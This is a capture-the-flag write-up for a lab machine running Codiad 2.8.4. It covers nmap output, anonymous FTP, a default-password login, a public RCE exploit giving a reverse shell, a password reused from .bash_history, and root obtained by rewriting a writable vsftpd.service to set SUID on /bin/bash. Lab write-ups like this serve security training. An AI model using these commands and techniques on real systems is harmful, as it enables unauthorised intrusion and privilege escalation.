## Nmap: 
---
```bash
nmap -T4 -n -A -p - 10.66.135.215 -oN nmap
```

```bash
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.154.152
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)
|   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)
|_  256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
62337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: B4A327D2242C42CF2EE89C623279665F
|_http-title: Codiad 2.8.4
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
- we see that a web-server is running, `SSH` is open and `FTP` 
- and we see another `web-server` is running on port `62337` 
- `FTP` has anonymous login allowed, so lets look into this first 
## FTP: 
---
```
ftp 10.66.135.215
```

```bash
ftp> ls -la
229 Entering Extended Passive Mode (|||13666|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        114          4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
drwxr-xr-x    2 0        0            4096 Jun 18  2021 ...
```
- lets go into the `...` directory 

```bash
ftp> ls -la
229 Entering Extended Passive Mode (|||57272|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             151 Jun 18  2021 -
drwxr-xr-x    2 0        0            4096 Jun 18  2021 .
drwxr-xr-x    3 0        114          4096 Jun 18  2021 ..
```
- lets download the `-` file with: `get -` 

- `-`: 
```bash
Hey john,
I have reset the password as you have asked. Please use the default password to login.
Also, please take care of the image file ;)
- drac.
```
- so we find our first two `usernames` 
- lets visit the website
## further Enumeration: 
---
![](IDE_1.png)
- when we open up the website we see the default apache page 
- lets use `Gobuster` to scan the `web-server` 
### Gobuster: 
---
```bash
gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/common.txt -u http://10.66.135.215 -o gobuster/first_enum
```

```bash
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 278]
```
- the scan didn't reveal anything useful for us 
- lets check out the other `web-server`

![](IDE_2.png)
- lets try to login in with `john` as the username and lets try using `password` as the default `password` 
- it works and we are logged in 
## Codiad 2.8.4 exploit: 
---
![](IDE_3.png)
- so this look like an online `IDE` 
- lets use `searchsploit` to search for an exploit: 
```bash
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Codiad 2.8.4 - Remote Code Execution (Authenticated)                                                                                                       | multiple/webapps/49705.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (2)                                                                                                   | multiple/webapps/49902.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (3)                                                                                                   | multiple/webapps/49907.py
Codiad 2.8.4 - Remote Code Execution (Authenticated) (4)                                                                                                   | multiple/webapps/50474.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------
```

- lets try the `49705.py`
- here is a little instruction how to execute the exploit: https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit?tab=readme-ov-file
- I did always got an error when I had to type `Y` for confirming the steps i had to do before, so i types `"Y"` and it worked for me  

![](IDE_4.png)

- after that i had a `reverse-shell` 
- to stabilize the shell a bit I did this: 
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

- then I moved into the `/home` directory and found the user `drac` 
- in his directory was the `user.txt`, but it was not possible to read it with the user: `www-data` 
- so we had to become `drac` 

- I looked through his `home-directory` and saw that the `.bash_history` was not empty and we could read it, so I did: 
```
mysql -u drac -p '<Redacted>'
```
- lets use this password to login into `drac` 

- now we can read the `user.txt`: 
```bash
0<Redated>6
```

- after that I executed `sudo -l`: 
```bash
Matching Defaults entries for drac on ide:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User drac may run the following commands on ide:
    (ALL : ALL) /usr/sbin/service vsftpd restart
```

- lets check if we can edit the `vsftpd.service` file 
- I found the file under `/lib/systemd/system`: 
```bash
-rw-rw-r-- 1 root drac 248 Aug  4  2021 vsftpd.service
```
- we can see that we can indeed edit the file

- so lets replace the content of the service-file and write our own 
- I searched in the internet for a little guide and found this: [Understanding systemctl and Systemd Services for Privilege Escalation](https://medium.com/@ashrafal3oni/understanding-systemctl-and-systemd-services-for-privilege-escalation-01201f976f85)

- so I put this code in the `vsftpd.service` (I wrote line by line with echo, because nano etc. breaks the shell): 
```bash
[Service]  
Type=oneshot  
ExecStart=/bin/bash -c "chmod +s /bin/bash"
```

- then I executed: `sudo /usr/sbin/service vsftpd restart` and checked `/bin/bash`: 
```bash
-rwsr-sr-x 1 root root 1113504 Jun  6  2019 /bin/bash
```
- as we can see, `bash` has now the `SUID`-bit set 
- lets execute `/bin/bash -p` and become `root` 

- now we can read the `root.txt`: 
```bash
c<Redacted>d
```